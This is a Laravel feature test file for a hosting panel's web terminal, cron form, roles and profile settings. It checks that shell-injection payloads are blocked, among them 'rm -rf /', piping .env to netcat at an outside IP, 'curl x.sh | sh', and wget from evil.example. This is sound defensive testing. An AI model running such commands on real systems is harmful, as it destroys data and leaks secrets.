<?php

namespace Tests\Feature;

use App\Models\HostingBilling;
use App\Models\HostingCron;
use App\Models\HostingProject;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

class SecurityHardeningTest extends TestCase
{
    use RefreshDatabase;

    private function makeOwner(): User
    {
        $owner = User::factory()->create(['role' => 'user_hosting']);
        HostingBilling::create([
            'user_id' => $owner->id,
            'plan_name' => 'Starter',
            'plan' => 'starter',
            'amount' => 50000,
            'billing_cycle' => 'monthly',
            'next_due_date' => now()->addDays(30),
            'status' => 'active',
        ]);

        return $owner;
    }

    private function makeProject(User $owner): HostingProject
    {
        return HostingProject::create([
            'user_id' => $owner->id,
            'project_name' => 'proj-' . uniqid(),
            'framework' => 'laravel',
            'branch' => 'main',
            'ryaze_domain' => 'tst-' . uniqid() . '.ryaze.my.id',
            'status' => 'active',
        ]);
    }

    public function test_terminal_rejects_shell_metacharacters(): void
    {
        $project = $this->makeProject($this->makeOwner());
        $admin = User::factory()->create(['role' => 'superadmin']);

        foreach (['ls; rm -rf /', 'cat .env | nc 1.2.3.4 4444', 'curl x.sh | sh', '$(whoami)', 'echo "id"'] as $payload) {
            $response = $this->actingAs($admin)->postJson(route('user_hosting.terminal', $project->hashid), [
                'command' => $payload,
            ]);

            $response->assertOk();
            $this->assertSame(1, $response->json('exit_code'), "harus diblokir: {$payload}");
            $this->assertStringContainsString('tidak diizinkan', $response->json('output'));
        }
    }

    public function test_terminal_rejects_control_characters(): void
    {
        $project = $this->makeProject($this->makeOwner());
        $admin = User::factory()->create(['role' => 'superadmin']);

        $response = $this->actingAs($admin)->postJson(route('user_hosting.terminal', $project->hashid), [
            'command' => "ls\nid",
        ]);

        $response->assertOk();
        $this->assertSame(1, $response->json('exit_code'));
        $this->assertStringContainsString('karakter kontrol', $response->json('output'));
    }

    public function test_terminal_rejects_command_outside_whitelist(): void
    {
        $project = $this->makeProject($this->makeOwner());
        $admin = User::factory()->create(['role' => 'superadmin']);

        $response = $this->actingAs($admin)->postJson(route('user_hosting.terminal', $project->hashid), [
            'command' => 'wget http://evil.example/x',
        ]);

        $response->assertOk();
        $this->assertSame(1, $response->json('exit_code'));
        $this->assertStringContainsString('tidak diizinkan', $response->json('output'));
    }

    public function test_viewer_member_cannot_use_terminal(): void
    {
        $owner = $this->makeOwner();
        $project = $this->makeProject($owner);
        $viewer = User::factory()->create(['role' => 'user_hosting']);
        HostingBilling::create([
            'user_id' => $viewer->id,
            'plan_name' => 'Starter',
            'plan' => 'starter',
            'amount' => 50000,
            'billing_cycle' => 'monthly',
            'next_due_date' => now()->addDays(30),
            'status' => 'active',
        ]);
        $project->teamMembers()->attach($viewer->id, ['role' => 'viewer']);

        $response = $this->actingAs($viewer)->postJson(route('user_hosting.terminal', $project->hashid), [
            'command' => 'ls',
        ]);

        $response->assertForbidden();
        $response->assertJsonFragment(['error' => 'Akses ditolak. Anda hanya berperan sebagai Viewer pada project ini.']);
    }

    public function test_viewer_member_cannot_create_cron(): void
    {
        $owner = $this->makeOwner();
        $project = $this->makeProject($owner);
        $viewer = User::factory()->create(['role' => 'user_hosting']);
        HostingBilling::create([
            'user_id' => $viewer->id,
            'plan_name' => 'Starter',
            'plan' => 'starter',
            'amount' => 50000,
            'billing_cycle' => 'monthly',
            'next_due_date' => now()->addDays(30),
            'status' => 'active',
        ]);
        $project->teamMembers()->attach($viewer->id, ['role' => 'viewer']);

        $response = $this->actingAs($viewer)->post(route('user_hosting.crons.store', $project->hashid), [
            'command' => 'php artisan schedule:run',
            'schedule_expression' => '* * * * *',
        ]);

        $response->assertSessionHas('error');
        $this->assertDatabaseCount('hosting_crons', 0);
    }

    public function test_cron_store_rejects_shell_metacharacters(): void
    {
        $project = $this->makeProject($this->makeOwner());
        $admin = User::factory()->create(['role' => 'superadmin']);

        $response = $this->actingAs($admin)->post(route('user_hosting.crons.store', $project->hashid), [
            'command' => 'php artisan cache:clear; rm -rf /',
            'schedule_expression' => '* * * * *',
        ]);

        $response->assertSessionHas('error', fn (string $v) => str_contains($v, 'tidak diizinkan'));
        $this->assertDatabaseCount('hosting_crons', 0);
    }

    public function test_email_change_resets_email_verification(): void
    {
        $user = User::factory()->create(['role' => 'user_hosting']);

        $this->actingAs($user)->patch(route('profile.update'), [
            'name' => $user->name,
            'email' => 'new-' . uniqid() . '@example.com',
        ]);

        $this->assertNull($user->fresh()->email_verified_at);
    }

    public function test_unchanged_email_keeps_verification(): void
    {
        $user = User::factory()->create(['role' => 'user_hosting']);

        $this->actingAs($user)->patch(route('profile.update'), [
            'name' => $user->name,
            'email' => $user->email,
        ]);

        $this->assertNotNull($user->fresh()->email_verified_at);
    }

    public function test_hashids_salt_is_configured(): void
    {
        $salt = config('hashids.connections.main.salt');

        $this->assertNotNull($salt);
        $this->assertNotEmpty($salt);
        $this->assertGreaterThanOrEqual(8, strlen($salt));
        $this->assertNotSame('', $salt);
    }

    public function test_hosting_indexes_migration_creates_performance_indexes(): void
    {
        $this->assertTrue(\Illuminate\Support\Facades\Schema::hasIndex('hosting_billings', 'hosting_billings_user_id_status_index'));
        $this->assertTrue(\Illuminate\Support\Facades\Schema::hasIndex('hosting_crons', 'hosting_crons_project_id_is_active_index'));
        $this->assertTrue(\Illuminate\Support\Facades\Schema::hasIndex('wallet_transactions', 'wallet_transactions_wallet_id_status_index'));
    }
}
